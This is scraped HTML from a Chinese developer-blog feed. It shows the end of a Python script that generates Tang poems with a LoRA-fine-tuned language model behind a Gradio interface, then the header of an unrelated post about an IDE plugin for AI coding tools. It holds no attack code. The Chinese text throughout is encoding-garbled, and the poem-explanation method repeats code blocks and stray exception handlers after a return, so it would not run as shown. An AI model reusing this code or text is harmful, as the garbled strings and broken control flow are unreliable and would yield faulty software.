        <span class="hljs-string">"""ç”Ÿæˆè¯—æ­Œï¼ˆå¸¦é‡è¯•æœºåˆ¶ï¼‰"""</span>
        <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(max_retry):
            <span class="hljs-keyword">try</span>:
                prompt = <span class="hljs-string">f"è¯·åˆ›ä½œä¸€é¦–å”è¯—ï¼š<span class="hljs-subst">{instruction}</span>\n\nä½œå“ï¼š"</span>
                inputs = self.tokenizer(prompt, return_tensors=<span class="hljs-string">"pt"</span>, max_length=<span class="hljs-number">200</span>, truncation=<span class="hljs-literal">True</span>)
                
                <span class="hljs-keyword">with</span> torch.no_grad():
                    outputs = self.model.generate(
                        **inputs,
                        max_new_tokens=<span class="hljs-number">150</span>,
                        temperature=<span class="hljs-number">0.7</span>,          <span class="hljs-comment"># é€‚ä¸­æ¸©åº¦</span>
                        do_sample=<span class="hljs-literal">True</span>,
                        top_p=<span class="hljs-number">0.9</span>,
                        top_k=<span class="hljs-number">40</span>,
                        repetition_penalty=<span class="hljs-number">1.3</span>,   <span class="hljs-comment"># é˜²æ­¢é‡å¤</span>
                        no_repeat_ngram_size=<span class="hljs-number">3</span>,
                        pad_token_id=self.tokenizer.eos_token_id,
                        eos_token_id=self.tokenizer.eos_token_id,
                        early_stopping=<span class="hljs-literal">True</span>,
                        num_return_sequences=<span class="hljs-number">1</span>
                    )
                
                full_text = self.tokenizer.decode(outputs[<span class="hljs-number">0</span>], skip_special_tokens=<span class="hljs-literal">True</span>)
                
                <span class="hljs-comment"># æå–è¯—æ­Œéƒ¨åˆ†</span>
                <span class="hljs-keyword">if</span> <span class="hljs-string">"ä½œå“ï¼š"</span> <span class="hljs-keyword">in</span> full_text:
                    poem = full_text.split(<span class="hljs-string">"ä½œå“ï¼š"</span>)[-<span class="hljs-number">1</span>].strip()
                <span class="hljs-keyword">else</span>:
                    poem = full_text
                
                <span class="hljs-comment"># è´¨é‡æ£€æŸ¥</span>
                <span class="hljs-keyword">if</span> self._check_poem_quality(poem):
                    <span class="hljs-keyword">return</span> poem
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f" ç¬¬<span class="hljs-subst">{attempt+<span class="hljs-number">1</span>}</span>æ¬¡ç”Ÿæˆè´¨é‡ä¸ä½³ï¼Œé‡è¯•..."</span>)
                    
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f" ç”Ÿæˆå‡ºé”™: <span class="hljs-subst">{e}</span>"</span>)
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ç”Ÿæˆå¤±è´¥ï¼Œè¯·è°ƒæ•´å‚æ•°é‡è¯•"</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_check_poem_quality</span>(<span class="hljs-params">self, poem</span>):
        <span class="hljs-string">"""æ£€æŸ¥è¯—æ­Œè´¨é‡"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> poem <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(poem) &lt; <span class="hljs-number">10</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            
        lines = poem.strip().split(<span class="hljs-string">'\n'</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines) &lt; <span class="hljs-number">2</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            
        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰ä¸¥é‡é‡å¤</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(lines)) &lt; <span class="hljs-built_in">len</span>(lines) * <span class="hljs-number">0.5</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">comprehensive_test</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""å…¨é¢æµ‹è¯•"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">" å…¨é¢æµ‹è¯• "</span>.center(<span class="hljs-number">50</span>, <span class="hljs-string">"="</span>))
        
        test_cases = [
            <span class="hljs-string">"æ˜¥æ—¥æ¸¸å›­"</span>,
            <span class="hljs-string">"å¤æ—¥è·å¡˜"</span>,
            <span class="hljs-string">"ç§‹æ—¥ç™»é«˜"</span>, 
            <span class="hljs-string">"å†¬æ—¥èµé›ª"</span>,
            <span class="hljs-string">"å±±æ°´é£å…‰"</span>,
            <span class="hljs-string">"æ€ä¹¡ä¹‹æƒ…"</span>,
            <span class="hljs-string">"å‹è°Šé•¿å­˜"</span>,
            <span class="hljs-string">"å’æ¢…å“æ ¼"</span>
        ]
        
        <span class="hljs-keyword">for</span> i, theme <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(test_cases, <span class="hljs-number">1</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næµ‹è¯• <span class="hljs-subst">{i}</span>: <span class="hljs-subst">{theme}</span>"</span>)
            poem = self.generate_poem(theme)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”Ÿæˆç»“æœ:\n<span class="hljs-subst">{poem}</span>"</span>)
            
            <span class="hljs-comment"># è´¨é‡è¯„ä¼°</span>
            lines = poem.strip().split(<span class="hljs-string">'\n'</span>)
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines) &gt;= <span class="hljs-number">4</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(lines)) &gt;= <span class="hljs-number">3</span>:
                quality = <span class="hljs-string">"âœ… è´¨é‡è‰¯å¥½"</span>
            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(lines) &gt;= <span class="hljs-number">2</span>:
                quality = <span class="hljs-string">"âš ï¸ è´¨é‡ä¸€èˆ¬"</span>
            <span class="hljs-keyword">else</span>:
                quality = <span class="hljs-string">"âŒ éœ€è¦ä¼˜åŒ–"</span>
                
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è´¨é‡è¯„ä¼°: <span class="hljs-subst">{quality}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">40</span>)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">explain_poem</span>(<span class="hljs-params">self, poem</span>):
        <span class="hljs-string">"""è°ƒç”¨æ¨¡å‹è§£é‡Šè¯—å¥å†…å®¹ï¼Œä»…è¾“å‡ºå¯¹è¯—å¥åœºæ™¯çš„è¯´æ˜"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> poem <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(poem.strip()) == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"æ— è¯—å¥å¯è§£é‡Š"</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ä¸´æ—¶åŠ è½½åŸå§‹æ¨¡å‹ï¼ˆéå¾®è°ƒæ¨¡å‹ï¼‰</span>
            original_model = AutoModelForCausalLM.from_pretrained(
                self.local_model_path2,
                trust_remote_code=<span class="hljs-literal">True</span>,
                torch_dtype=torch.float32,
                device_map=self.device
            )
            prompt = (
                <span class="hljs-string">"è¯·ç”¨ä¸€æ®µç°ä»£æ±‰è¯­è§£é‡Šä»¥ä¸‹è¯—å¥ä¸­å‘ˆç°çš„åœºæ™¯ï¼Œ200å­—ä»¥å†…"</span>
                <span class="hljs-string">"ä»…æè¿°ç”»é¢ï¼Œä¸è¦åˆ†ææƒ…æ„Ÿæˆ–æ‰©å±•å…¶ä»–å†…å®¹ï¼š\n\n"</span>
                <span class="hljs-string">f"ã€è¯—å¥ã€‘\n<span class="hljs-subst">{poem}</span>\n"</span>
                <span class="hljs-string">"ã€è§£é‡Šã€‘"</span>
            )
            inputs = self.tokenizer(prompt, return_tensors=<span class="hljs-string">"pt"</span>, max_length=<span class="hljs-number">200</span>, truncation=<span class="hljs-literal">True</span>)
            <span class="hljs-keyword">with</span> torch.no_grad():
                outputs = original_model.generate(
                    **inputs,
                    max_new_tokens=<span class="hljs-number">200</span>,  <span class="hljs-comment"># é™åˆ¶ç”Ÿæˆé•¿åº¦</span>
                    temperature=<span class="hljs-number">0.3</span>,    <span class="hljs-comment"># è¿›ä¸€æ­¥é™ä½éšæœºæ€§</span>
                    do_sample=<span class="hljs-literal">True</span>,
                    top_p=<span class="hljs-number">0.7</span>,
                    repetition_penalty=<span class="hljs-number">1.5</span>,  <span class="hljs-comment"># å‡å°‘é‡å¤å†…å®¹</span>
                    eos_token_id=self.tokenizer.eos_token_id,
                    early_stopping=<span class="hljs-literal">True</span>,
                )
            explanation = self.tokenizer.decode(outputs[<span class="hljs-number">0</span>], skip_special_tokens=<span class="hljs-literal">True</span>)
            
            <span class="hljs-comment"># ä¸¥æ ¼æ¸…ç†ï¼šä»…ä¿ç•™ã€è§£é‡Šã€‘åçš„å†…å®¹ï¼Œå¹¶å»é™¤æ— å…³æ–‡æœ¬</span>
            explanation = explanation.split(<span class="hljs-string">"ã€è§£é‡Šã€‘"</span>)[-<span class="hljs-number">1</span>].strip()
            explanation = re.sub(<span class="hljs-string">r"\n|"</span>  <span class="hljs-comment"># å»é™¤æ¢è¡Œå’Œæ— å…³ç¬¦å·</span>
                                <span class="hljs-string">r"Human:.*|Assistant:.*|"</span>
                                <span class="hljs-string">r"A:.*|B:.*|"</span>  <span class="hljs-comment"># å»é™¤å¯¹è¯æ ‡è®°</span>
                                <span class="hljs-string">r"\d{4}å¹´.*|è°¢è°¢.*|è¯·é—®.*"</span>, 
                                <span class="hljs-string">""</span>, explanation)
            <span class="hljs-keyword">return</span> explanation <span class="hljs-keyword">if</span> explanation <span class="hljs-keyword">else</span> <span class="hljs-string">"è§£é‡Šç”Ÿæˆå¤±è´¥"</span>
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"è§£é‡Šå¤±è´¥ï¼š<span class="hljs-subst">{e}</span>"</span>
            explanation = self.tokenizer.decode(outputs[<span class="hljs-number">0</span>], skip_special_tokens=<span class="hljs-literal">True</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è§£é‡Šç»“æœï¼š\n<span class="hljs-subst">{explanation}</span>"</span>)
            <span class="hljs-comment"># ä¸¥æ ¼æ¸…ç†ï¼šä»…ä¿ç•™ã€è§£é‡Šã€‘åçš„å†…å®¹ï¼Œå¹¶å»é™¤æ— å…³æ–‡æœ¬</span>
            explanation = explanation.split(<span class="hljs-string">"ã€è§£é‡Šã€‘"</span>)[-<span class="hljs-number">1</span>].strip()
            explanation = re.sub(<span class="hljs-string">r"\n|"</span>  <span class="hljs-comment"># å»é™¤æ¢è¡Œå’Œæ— å…³ç¬¦å·</span>
                                <span class="hljs-string">r"Human:.*|Assistant:.*|"</span>
                                <span class="hljs-string">r"\d{4}å¹´.*|è°¢è°¢.*|è¯·é—®.*"</span>, 
                                <span class="hljs-string">""</span>, explanation)
            <span class="hljs-keyword">return</span> explanation <span class="hljs-keyword">if</span> explanation <span class="hljs-keyword">else</span> <span class="hljs-string">"è§£é‡Šç”Ÿæˆå¤±è´¥"</span>
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"è§£é‡Šå¤±è´¥ï¼š<span class="hljs-subst">{e}</span>"</span>
            
            outputs = original_model.generate(
                **inputs,
                max_new_tokens=<span class="hljs-number">150</span>,
                temperature=<span class="hljs-number">0.5</span>,
                do_sample=<span class="hljs-literal">True</span>,
                top_p=<span class="hljs-number">0.8</span>,
                repetition_penalty=<span class="hljs-number">1.25</span>,
                no_repeat_ngram_size=<span class="hljs-number">3</span>,
                pad_token_id=self.tokenizer.eos_token_id,
                eos_token_id=self.tokenizer.eos_token_id,
                early_stopping=<span class="hljs-literal">True</span>,
            )
            explanation = self.tokenizer.decode(outputs[<span class="hljs-number">0</span>], skip_special_tokens=<span class="hljs-literal">True</span>)
            explanation = re.sub(<span class="hljs-string">r"Human:.*|Assistant:.*|ï¼ˆ.*"</span>, <span class="hljs-string">""</span>, explanation).strip()

            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è§£é‡Šç»“æœï¼š\n<span class="hljs-subst">{explanation}</span>"</span>)
            <span class="hljs-comment"># æ¸…ç†è¾“å‡º</span>
            lines = [l.strip() <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> poem.split(<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">if</span> l.strip()]
            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> lines:
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(l) &gt; <span class="hljs-number">0</span>:
                    explanation = explanation.replace(l, <span class="hljs-string">""</span>)
            <span class="hljs-comment"># å»æ‰ä¹¦åå·æ ‡é¢˜</span>
            explanation = re.sub(<span class="hljs-string">r"ã€Š[^ã€‹]+ã€‹"</span>, <span class="hljs-string">""</span>, explanation)
            <span class="hljs-comment"># å½’ä¸€åŒ–ä¸ºå•æ®µ</span>
            explanation = re.sub(<span class="hljs-string">r"\s+"</span>, <span class="hljs-string">" "</span>, explanation.replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">" "</span>)).strip()

            <span class="hljs-comment"># å…œåº•ï¼šè‹¥ä»ä¸ºç©ºï¼Œç»™é€šç”¨è§£é‡Š</span>
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(explanation) &lt; <span class="hljs-number">30</span>:
                explanation = <span class="hljs-string">"è¿™é¦–è¯—é€šè¿‡å…¸å‹æ„è±¡ä¸åœºæ™¯çš„æå†™ï¼Œä¼ è¾¾äº†ä½œè€…çš„æƒ…æ„Ÿå–å‘ä¸å®¡ç¾è¶£å‘³ï¼Œå€Ÿæ™¯æŠ’æƒ…ã€ä»¥ç‰©å¯„æ„ï¼Œå½¢æˆå«è“„è€Œæ‚ è¿œçš„æ„å¢ƒï¼Œè¯»æ¥æ¸…æ–°è‡ªç„¶ã€éŸµå‘³ç»µé•¿ã€‚"</span>
            <span class="hljs-keyword">return</span> explanation
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"è§£é‡Šå¤±è´¥ï¼š<span class="hljs-subst">{e}</span>"</span>
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_gradio</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ„å»ºGradioç•Œé¢ï¼šä¸»é¢˜é€‰æ‹© + ç®€å•æè¿°ï¼ˆç•™ç©ºåˆ™é»˜è®¤ï¼‰ï¼Œç”Ÿæˆè¯—å¥ä¸å•æ®µè§£é‡Š"""</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">theme, desc, need_explain</span>):
            theme_map = {
                <span class="hljs-string">"å››å­£å˜æ¢"</span>: <span class="hljs-string">"æ˜¥å¤ç§‹å†¬è½®æ¢"</span>,
                <span class="hljs-string">"å±±æ°´ç”°å›­"</span>: <span class="hljs-string">"å±±æ°´ç”°å›­é£å…‰"</span>,
                <span class="hljs-string">"æŠ’æƒ…è¨€å¿—"</span>: <span class="hljs-string">"æŠ’æƒ…è¨€å¿—"</span>,
                <span class="hljs-string">"è¾¹å¡é£äº‘"</span>: <span class="hljs-string">"è¾¹å¡é£äº‘"</span>,
                <span class="hljs-string">"å’ç‰©å¯„æƒ…"</span>: <span class="hljs-string">"å’ç‰©å¯„æƒ…"</span>,
                <span class="hljs-string">"èŠ‚æ—¥æ—¶ä»¤"</span>: <span class="hljs-string">"èŠ‚æ—¥æ—¶ä»¤"</span>
            }
            default_desc = {
                <span class="hljs-string">"å››å­£å˜æ¢"</span>: <span class="hljs-string">"æå†™æ˜¥å¤ç§‹å†¬æ°”å€™ä¸æ™¯ç‰©å˜è¿ï¼Œè¡¨ç°ç”Ÿå‘½è½®å›çš„éŸµå¾‹ã€‚"</span>,
                <span class="hljs-string">"å±±æ°´ç”°å›­"</span>: <span class="hljs-string">"å€Ÿé’å±±ç¢§æ°´ä¸ç”°å›­åŠ³ä½œï¼ŒæŠ’å†™æ¬æ·¡å®é™çš„ç”Ÿæ´»æƒ…è¶£ã€‚"</span>,
                <span class="hljs-string">"æŠ’æƒ…è¨€å¿—"</span>: <span class="hljs-string">"ç›´æ¥æŠ’å‘å†…å¿ƒæƒ…æ„Ÿä¸å¿—å‘ï¼Œè¡¨è¾¾äººç”Ÿç†æƒ³ä¸æ„Ÿæ€€ã€‚"</span>,
                <span class="hljs-string">"è¾¹å¡é£äº‘"</span>: <span class="hljs-string">"æç»˜è¾¹å…³æ²™åœºä¸å°†å£«é£éª¨ï¼Œå±•ç°å®¶å›½æƒ…æ€€ä¸æˆè¾¹è‰°è¾›ã€‚"</span>,
                <span class="hljs-string">"å’ç‰©å¯„æƒ…"</span>: <span class="hljs-string">"æ‰˜ç‰©è¨€å¿—ï¼Œé€šè¿‡æ¢…ç«¹æ¾èŠç­‰æ„è±¡å¯„å¯“å“æ ¼ä¸æƒ…æ€€ã€‚"</span>,
                <span class="hljs-string">"èŠ‚æ—¥æ—¶ä»¤"</span>: <span class="hljs-string">"å›´ç»•ä¼ ç»ŸèŠ‚ä»¤ä¹ ä¿—ä¸äººæƒ…ä¸–äº‹ï¼Œä¹¦å†™å›¢åœ†ã€è¿½å¿†ä¸ç¥ˆæ„¿ã€‚"</span>
            }
            base = theme_map.get(theme, theme)
            desc_text = (desc <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>).strip() <span class="hljs-keyword">or</span> default_desc.get(theme, <span class="hljs-string">""</span>)
            instruction = <span class="hljs-string">f"ä¸»é¢˜ï¼š<span class="hljs-subst">{base}</span>ã€‚ç®€è¿°ï¼š<span class="hljs-subst">{desc_text}</span>"</span>
            poem = self.generate_poem(instruction)
            explanation = self.explain_poem(poem) <span class="hljs-keyword">if</span> need_explain <span class="hljs-keyword">else</span> <span class="hljs-string">"ï¼ˆæœªé€‰æ‹©è§£é‡Šï¼‰"</span>
            <span class="hljs-keyword">return</span> poem, explanation
        
        dropdown = gr.Dropdown(choices=[<span class="hljs-string">"å››å­£å˜æ¢"</span>,<span class="hljs-string">"å±±æ°´ç”°å›­"</span>,<span class="hljs-string">"æŠ’æƒ…è¨€å¿—"</span>,<span class="hljs-string">"è¾¹å¡é£äº‘"</span>,<span class="hljs-string">"å’ç‰©å¯„æƒ…"</span>,<span class="hljs-string">"èŠ‚æ—¥æ—¶ä»¤"</span>], label=<span class="hljs-string">"ä¸»é¢˜"</span>)
        textbox = gr.Textbox(lines=<span class="hljs-number">2</span>, placeholder=<span class="hljs-string">"ä¾‹å¦‚ï¼šæ˜¥é›¨ã€è·å¡˜ã€æ€ä¹¡ã€å’æ¢…ç­‰ç®€è¦æè¿°ï¼ˆç•™ç©ºåˆ™ä½¿ç”¨é»˜è®¤ï¼‰"</span>, label=<span class="hljs-string">"ç®€å•æè¿°"</span>)
        checkbox = gr.Checkbox(label=<span class="hljs-string">"ç”Ÿæˆè§£é‡Š"</span>, value=<span class="hljs-literal">True</span>)
        output_poem = gr.Textbox(lines=<span class="hljs-number">8</span>, label=<span class="hljs-string">"ç”Ÿæˆè¯—å¥"</span>)
        output_exp = gr.Textbox(lines=<span class="hljs-number">6</span>, label=<span class="hljs-string">"è¯—å¥è§£é‡Šï¼ˆå•æ®µï¼‰"</span>)
        
        iface = gr.Interface(
            fn=generate,
            inputs=[dropdown, textbox, checkbox],
            outputs=[output_poem, output_exp],
            title=<span class="hljs-string">"å”è¯—ç”Ÿæˆå™¨ï¼ˆLoRAå¾®è°ƒï¼‰"</span>,
            description=<span class="hljs-string">"é€‰æ‹©ä¸»é¢˜å¹¶å¯å¡«å†™ç®€è¿°ï¼›ç•™ç©ºåˆ™ä½¿ç”¨é»˜è®¤æè¿°ã€‚è§£é‡Šä»…è¾“å‡ºä¸€æ®µç°ä»£æ±‰è¯­è¯´æ˜ã€‚"</span>
        )
        <span class="hljs-keyword">return</span> iface

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-string">"""ä¸»å‡½æ•°"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">" å”è¯—LoRAå¾®è°ƒç³»ç»Ÿå¯åŠ¨"</span>)
    
    <span class="hljs-comment"># è§£æå‘½ä»¤è¡Œå‚æ•°</span>
    parser = argparse.ArgumentParser()
    parser.add_argument(<span class="hljs-string">"--skip-training"</span>, action=<span class="hljs-string">"store_true"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"å·²è®­ç»ƒæ¨¡å‹æ—¶è·³è¿‡è®­ç»ƒï¼Œç›´æ¥æµ‹è¯•"</span>)
    args = parser.parse_args()

    <span class="hljs-comment"># åˆå§‹åŒ–è®­ç»ƒå™¨</span>
    <span class="hljs-comment"># trainer = TangPoetryTrainer(skip_training=args.skip_training)</span>
    trainer = TangPoetryTrainer(skip_training=<span class="hljs-literal">True</span>)
    
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> trainer.skip_training:
        <span class="hljs-comment"># æ­£å¸¸æµç¨‹ï¼šåŠ è½½åŸºåº§æ¨¡å‹ä¸LoRAå¹¶è®­ç»ƒ</span>
        trainer.setup_model()
        trainer.setup_lora()
        trainer.train()
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># è·³è¿‡è®­ç»ƒï¼šç›´æ¥åŠ è½½å·²è®­ç»ƒæ¨¡å‹</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">" è·³è¿‡è®­ç»ƒï¼Œç›´æ¥åŠ è½½å·²è®­ç»ƒæ¨¡å‹è¿›è¡Œæµ‹è¯•"</span>)
        trainer.load_trained_model(<span class="hljs-string">"./tang_poetry_lora"</span>)
    
    <span class="hljs-comment"># å¯åŠ¨Gradioç•Œé¢</span>
    iface = trainer.build_gradio()
    iface.launch(server_name=<span class="hljs-string">"0.0.0.0"</span>, share=<span class="hljs-literal">False</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n ç¨‹åºæ‰§è¡Œå®Œæˆï¼"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<p><img alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" src="" loading="lazy"/></p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[IDEA Claude Code or Codex GUI æ’ä»¶ã€å¼€æºè‡ªèã€‘]]></title>    <link>https://juejin.cn/post/7592912896591216659</link>    <guid>https://juejin.cn/post/7592912896591216659</guid>    <pubDate>2026-01-09T02:48:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592912896591216659" data-draft-id="7592865044692107270" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="IDEA Claude Code or Codex GUI æ’ä»¶ã€å¼€æºè‡ªèã€‘"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,GitHub"/> <meta itemprop="datePublished" content="2026-01-09T02:48:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœ±æ˜†é¹"/> <meta itemprop="url" content="https://juejin.cn/user/2788017219055175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            IDEA Claude Code or Codex GUI æ’ä»¶ã€å¼€æºè‡ªèã€‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2788017219055175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœ±æ˜†é¹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T02:48:51.000Z" title="Fri Jan 09 2026 02:48:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 